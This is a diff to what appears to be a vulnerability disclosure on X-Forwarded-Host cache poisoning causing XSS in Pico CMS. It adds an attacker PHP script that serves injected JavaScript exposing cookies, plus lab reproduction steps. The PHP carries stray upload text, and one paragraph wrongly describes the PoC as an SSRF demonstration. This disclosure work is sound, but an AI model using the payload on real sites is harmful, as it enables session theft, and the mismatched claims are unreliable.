@@ -144,13 +144,27 @@ X-Forwarded-Port: 443
 
 Reproduced in an authorized local Docker compose lab against Pico 2.1.4 (port 9087) and 3.0.0-alpha.2 (port 9088). Browser-side JavaScript execution was confirmed by rendering the injected HTML in Chromium headless and observing DOM modification by the attacker-controlled script. Tests were non-destructive; no production system or real CDN was used.
 
-**Evidence:** [`evidence/vulnerability-exposure.png`](./evidence/vulnerability-exposure.png), [`evidence/poc-execution.png`](./evidence/poc-execution.png)
+**Evidence:** 
+<img width="1000" height="1672" alt="vulnerability-exposure" src="https://github.com/user-attachments/assets/92822336-958c-4e6b-8f0a-e29580856a9c" />
+<img width="1000" height="1753" alt="poc-execution" src="https://github.com/user-attachments/assets/67e617e4-3f34-4b09-a158-bd39c53515fc" />
 
+**evil.php**
+```php
+[U<?php
+$u = $_SERVER['REQUEST_URI'];
+if (substr($u, -3) === '.js') {
+    header('Content-Type: application/javascript');
+    echo "document.addEventListener('DOMContentLoaded',function(){var b=document.createElement('div');b.style.cssText='position:fixed;top:0;left:0;right:0;z-index:99999;background:#c0392b;color:#fff;font:bold 18px sans-serif;padding:16px;text-align:center';b.textContent='XSS executado via web cache poisoning (X-Forwarded-Host) -- JS servido por attacker-cdn (localhost:8888)';document.body.appendChild(b);document.cookie&&(b.textContent+=' | cookies: '+document.cookie);});\n";
+} else {
+    header('Content-Type: text/plain'); http_response_code(200); echo '';
+}
+ploading evil.php…]()
+```
 ---
 
 ## 8. Proof of Concept
 
-O PoC é para ambientes autorizados apenas. Demonstra injeção de URL de recursos e execução de JavaScript no navegador; não inclui cache compartilhado e não reivindica cache poisoning contra terceiros.
+The PoC is for authorized environments only. It targets a local lab and demonstrates the SSRF callback and non-blind disclosure. No real internal service or cloud metadata endpoint is contacted.
 
 ```bash
 #!/bin/bash
@@ -344,11 +358,10 @@ echo "   Strip X-Forwarded-* headers at the edge proxy."
 ## 9. Reproduction Steps
 
 1. Start Pico CMS in the authorized lab: `docker compose up -d` (port 9087, `base_url: ~`).
-2. Start the controlled resource server: `php -S 127.0.0.1:8888 report/pico-xfh-cache-poisoning-xss/scripts/attacker-root/evil.php`.
-3. Run `bash report/pico-xfh-cache-poisoning-xss/poc.sh`.
-4. Observe that `evidence/poisoned_response.html` contains `<script src="http://127.0.0.1:8888/...">`.
-5. Open `evidence/poc-execution.png` — the attacker-controlled JS banner is visible in the rendered page.
-6. Compare: `curl -s http://127.0.0.1:9087/ | grep script` without the header shows only the legitimate host.
+2. Start the controlled resource server: `php -S 127.0.0.1:8888 evil.php`.
+3. Run `bash poc.sh` 
+4. Observe `poc-execution.png` — the attacker-controlled JS banner is visible in the rendered page.
+5. Compare: `curl -s http://127.0.0.1:9087/ | grep script` without the header shows only the legitimate host.
 
 ---
 
